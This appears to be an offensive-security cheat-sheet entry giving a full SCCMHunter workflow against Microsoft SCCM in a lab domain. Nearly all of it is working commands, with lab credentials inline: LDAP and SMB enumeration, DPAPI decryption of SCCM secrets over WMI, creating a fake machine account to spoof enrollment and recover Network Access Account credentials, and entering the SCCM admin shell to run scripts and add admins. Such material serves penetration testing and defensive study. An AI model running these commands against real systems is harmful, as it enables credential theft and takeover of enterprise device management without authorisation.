# 17.17 SCCMHunter full workflow

> Hit `SCCMHunter find/smb/dpapi/http/admin/get_device/interact` to enumerate, recover NAA via fake DDR, and pivot to the SCCM admin API.

## Overview

SCCMHunter enumerates SCCM infrastructure via LDAP (find), profiles SMB shares and site roles (smb), extracts SCCM secrets from WMI/disk (dpapi), recovers NAA policies by posing as a new machine (http), queries the SCCM admin API (admin), and lists/interacts with enrolled devices (get_device, interact).

## Steps

- find module: LDAP queries for System Management container, Management Points, SCCM/MECM strings
- show -all: display all discovered SiteServers, ManagementPoints, USERS, GROUPS, COMPUTERS tables
- smb -save: profile SCCM servers, determine roles/signing, save any PXE boot variable files found
- dpapi -wmi/-disk/-both: decrypt DPAPI-protected SCCM secrets (NAA, task sequences, collection variables)
- http -cn/-cp: spoof computer enrollment to request policy and obtain NAA credentials
- admin module: show_admins, get_device, interact <resourceId>, administrators, ls, script, add_admin

## Commands

### Install SCCMHunter

```bash
git clone -q https://github.com/garrettfoster13/sccmhunter
```

### LDAP enumeration

```bash
python3 sccmhunter.py find -u blwasp -p Password123! -d lab.local -dc-ip 172.50.0.10
```

### SMB profiling + save PXE vars

```bash
python3 sccmhunter.py smb -u blwasp -p Password123! -d lab.local -dc-ip 172.50.0.10 -save
```

### DPAPI secret extraction via WMI

```bash
python3 sccmhunter.py dpapi -u rai -p Threathunting01 -d lab.local -dc-ip 172.50.0.10 -target 172.50.0.21 -wmi
```

### Spoof machine enrollment to get NAA

```bash
addcomputer.py -computer-name 'PWNED$' -computer-pass 'ComputerPass123' -dc-ip 172.50.0.10 'LAB.LOCAL/Blwasp':'Password123!'
```

### Admin shell — list admins + run script

```bash
python3 sccmhunter.py admin -u blwasp -p 'Password123!' -ip 172.50.0.40
```

### Admin shell with alternate approval creds

```bash
python3 sccmhunter.py admin -u blwasp -p 'Password123!' -ip 172.50.0.40 -au 'PWNED$' -ap ComputerPass123
```
